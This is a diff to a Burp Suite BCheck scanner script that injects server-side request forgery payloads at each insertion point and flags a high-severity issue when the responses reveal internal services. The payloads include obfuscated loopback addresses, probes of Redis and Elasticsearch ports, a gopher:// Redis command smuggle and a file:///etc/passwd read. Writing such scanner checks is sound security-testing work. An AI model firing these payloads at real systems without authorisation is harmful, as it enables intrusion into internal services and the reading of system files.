@@ -5,22 +5,23 @@ metadata:
     author: "BCheck Arsenal"
     tags: "ssrf", "internal", "waf-bypass"
 
+run for each:
+    payload = "http://127.0.0.1/",
+        "http://localhost/",
+        "http://[::1]/",
+        "http://127.1/",
+        "http://0/",
+        "http://0x7f000001/",
+        "http://127.0.0.1:6379/INFO",
+        "http://127.0.0.1:9200/_cluster/health",
+        "gopher://127.0.0.1:6379/_INFO%0D%0A",
+        "file:///etc/passwd"
+
 given insertion point then
     send payload:
-        replacing: "{insertion_point}"
-        following replacements:
-            - "http://127.0.0.1/"
-            - "http://localhost/"
-            - "http://[::1]/"
-            - "http://127.1/"
-            - "http://0/"
-            - "http://0x7f000001/"
-            - "http://127.0.0.1:6379/INFO"
-            - "http://127.0.0.1:9200/_cluster/health"
-            - "gopher://127.0.0.1:6379/_INFO%0D%0A"
-            - "file:///etc/passwd"
+        replacing: {payload}
 
-    if {check.response} matches "(redis_version|cluster_name|elasticsearch|consul|root:x:|127\.0\.0\.1)" then
+    if {latest.response} matches "(redis_version|cluster_name|elasticsearch|consul|root:x:|127\.0\.0\.1)" then
         report issue:
             severity: high
             confidence: firm
